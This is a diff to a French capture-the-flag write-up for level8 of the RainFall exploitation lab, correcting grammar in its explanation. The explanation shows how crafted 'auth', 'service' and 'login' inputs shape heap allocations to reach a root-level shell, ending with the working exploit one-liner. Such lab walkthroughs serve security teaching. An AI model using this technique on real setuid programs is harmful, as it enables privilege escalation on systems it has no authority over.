@@ -19,7 +19,7 @@ Pour resoudre le niveau il faut pouvoir avoir un pointeur a 'p_auth+32' qui cont
 				p_auth = malloc(4);
 """
 
-Le programme permet de faire de nombreuses allocations, il faut dans un premier temps donne une adresse a 'p_auth' grace a la chaine "auth A" qui permet de rentrer dans le premier strncmp et alloue 4 octet a p_auth
+Le programme permet de faire de nombreuses allocations, il faut dans un premier temps donne une valeur a la variable 'p_auth' grace a la chaine "auth A" qui permet de rentrer dans le premier strncmp et alloue 4 octets a p_auth
 
 """
 			if (!strncmp(area, service, 6) == 0)
@@ -35,7 +35,7 @@ Il faut maintenant allouer de la donnee supplementaire jusqu'a atteindre l'adres
 					system("/bin/sh");
 """
 
-Il faut maintenant utilise a la chaine "login" pour passer dans le if qui nous donnera l'acces au shell avec les droits level9
+Il faut maintenant utilise la chaine "login" pour passer dans le if qui nous donnera l'acces au shell avec les droits level9
 
 
 level8@RainFall:~$ python -c 'print "auth A\n" + "service A\n"*2 + "login\n"' > /tmp/b ; cat /tmp/b - | ./level8
